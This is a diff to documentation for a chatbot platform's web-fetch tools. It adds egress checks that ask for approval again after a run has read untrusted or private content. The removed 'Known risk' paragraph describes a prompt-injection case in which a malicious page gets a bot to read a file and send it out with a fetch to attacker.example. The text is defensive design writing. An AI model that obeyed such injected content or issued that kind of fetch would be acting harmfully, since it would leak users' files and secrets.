@@ -83,10 +83,15 @@ Search queries go to the configured backend that handles them (your SearXNG inst
   inside a page as coming from you.
 - **Approvals.** The tools are split by where they send data:
   - `web_search` only talks to the search provider you configured, so it runs
-    without asking, like other read-only tools.
+    without asking, like other read-only tools, until the run has read private
+    data. After untrusted content only (a page, a feed), a later search still
+    does not ask. A standing grant does not waive a fetch once the run is
+    tainted, unless the bot's "allow sending data after reads" setting is on.
   - `web_extract`, `web_feed`, `web_sitemap` and `web_metadata` contact any
     address the model picks, so they **ask for approval on every call under the
-    default policy**, exactly like `browser_open`.
+    default policy**, exactly like `browser_open`. After the run has read
+    untrusted or private content they ask even under a grant or the `full`
+    preset, unless that bot setting is on.
   - All five belong to the `browser` permission category: if you set `browser`
     to `deny` for a bot, they are all denied.
 
@@ -95,23 +100,23 @@ Search queries go to the configured backend that handles them (your SearXNG inst
 If you trust a bot enough, approve one fetch with the "always" choice (the
 `always` scope in [Chatting and approvals](chatting-and-approvals.md)). That
 remembers `web_extract` (or the tool you approved) for that bot only, and later
-calls run without a prompt. Grant each fetch tool separately; `always_category`
-would also cover every other `browser` tool, so prefer the per-tool choice. You
-can review and remove grants as described in that guide.
+calls run without a prompt while the run has not read anything. Once a page or
+a private read is still in the conversation the model sees, a later fetch asks
+again. Grant each fetch tool separately; `always_category` would also cover
+every other `browser` tool, so prefer the per-tool choice. You can review and
+remove grants as described in that guide. The per-bot "allow sending data after
+reads" setting is the only way to skip the ask after a read.
 
 ## Known risk
 
-The permission engine has no taint or egress tracking for content read from
-untrusted sources, so this risk is bounded, not prevented. If you grant a fetch
-tool to a bot that can also read files (for example a General assistant, which
-has `fs_read`), a malicious page can try to persuade the bot (prompt injection)
-to read a file and send it out with
-`web_extract https://attacker.example/?d=<file contents>`, repeatedly and
-without a prompt. Without the grant every fetch asks, and you see the URL
-before it is sent. Mitigations that exist: URLs are capped at 2,048 characters
-and search queries at 400, local and private addresses are refused, results are
-labelled untrusted, and you can drop `fs_*` or `web_*` from a bot's `allow`
-list. Do not grant fetch to a bot that handles secrets or reads sensitive files.
+A fetch you have granted, or a `full` bot, can still send data out until the
+run has read something. After that read, the egress gate asks on later turns
+too, while the read is still in the conversation (see
+[Security model](security.md)), unless you turned on the per-bot setting. The
+URL and the query are shown in full on the card. URLs are capped at 2,048
+characters and search queries at 400, local and private addresses are refused,
+and results are labelled untrusted. Do not turn the setting on for a bot that
+handles secrets.
 
 ## Check that it works
 
